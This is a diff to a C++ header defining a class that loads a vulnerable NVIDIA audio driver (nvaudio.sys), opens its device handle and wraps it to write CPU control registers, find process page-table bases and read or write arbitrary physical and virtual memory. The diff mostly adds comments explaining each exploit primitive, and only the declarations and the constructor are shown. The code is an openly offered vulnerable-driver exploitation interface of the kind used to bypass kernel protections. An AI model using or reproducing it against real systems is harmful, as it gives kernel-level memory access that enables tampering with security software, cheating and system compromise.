@@ -3,32 +3,84 @@
 #include <iostream>
 #include <tlhelp32.h>
 
-struct NVDrv
+class NVDrv
 {
 
 public:
+    /*
+    *	IO call to driver for __readcrX() intrinsic where X = (int cr)
+    */
     DWORD                   ReadCr(int cr);
+
+    /*
+    *	IO call to driver for __writecrX(value) intrinsic where X = (int cr)
+    */
     BOOL                    WriteCr(int cr, DWORD64 value);
 
+    /*
+    *	Gets the file path of a running process by name
+    */
     std::wstring            GetProcessPath(const std::wstring& processName);
+
+    /*
+    *	Return the base address of a running process
+    */
     uintptr_t               GetProcessBase(const std::wstring& processName);
+
+
+    /*
+    *	Bruteforcing to get the directory base of a process with it's base address
+    */
     uintptr_t               GetProcessCR3(uintptr_t base_address);
+
+    /*
+    *	Get system directory base by walking PROCESSOR_START_BLOCK
+    */
     uintptr_t               GetSystemCR3();
 
+    /*
+    *	IO call to driver for MmGetPhysicalAddress
+    */
     uintptr_t               MmGetPhysicalAddress(uintptr_t virtual_address);
+
+
+    /*
+    *	Translates linear/virtual addresses to physical addresses with rightful directory base
+    */
     uintptr_t               TranslateLinearToPhysicalAddress(uintptr_t virtual_address);
 
 
+    /*
+    *	IO call to driver for physical memory memcpy read via MmMapIoSpace
+    */
     BOOL                    ReadPhysicalMemory(uintptr_t physical_address, void* OUT res, int size);
+
+    /*
+    *	IO call to driver for physical memory memcpy write via MmMapIoSpace
+    */
     BOOL                    WritePhysicalMemory(uintptr_t physical_address, void* IN  res, int size);
 
+    /*
+    *	Read virtual memory via translating virtual addresses to physical addresses
+    */
     BOOL                    ReadVirtualMemory(uintptr_t address, LPVOID output, unsigned long size);
+
+    /*
+    *	Write virtual memory via translating virtual addresses to physical addresses
+    */
     BOOL                    WriteVirtualMemory(uintptr_t address, LPVOID data, unsigned long size);
 
+    /*
+    *	Swap reading context for TranslateLinearToPhysicalAddress
+    */
     BOOL                    SwapReadContext(uintptr_t target_cr3);
 
     NVDrv()
     {
+        /*
+        *	Import the vulnerable driver into memory
+        */
+
         HMODULE nvaudio = LoadLibraryW(L"C:\\nvaudio.sys");
 
         if (!nvaudio)
@@ -37,7 +89,18 @@ public:
             exit(5000);
         }
 
+
+        /*
+        *	Get the payload encryption function sub_2130
+        */
+
         encrypt_payload = (decltype(encrypt_payload))(__int64(nvaudio) + 0x2130);
+
+
+
+        /*
+        *	Open a handle to the driver
+        */
 
         this->nvhandle = CreateFileW(L"\\\\.\\NVR0Internal", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
 
@@ -50,6 +113,10 @@ public:
         }
     }
 
+
+    /*
+    *	Read template for ReadVirtualMemory()
+    */
     template<typename T>
     T Read(uintptr_t address)
     {
@@ -61,6 +128,9 @@ public:
         return buffer;
     }
 
+    /*
+    *	Write template for WriteVirtualMemory()
+    */
     template<typename T>
     BOOL Write(uintptr_t address, T val)
     {
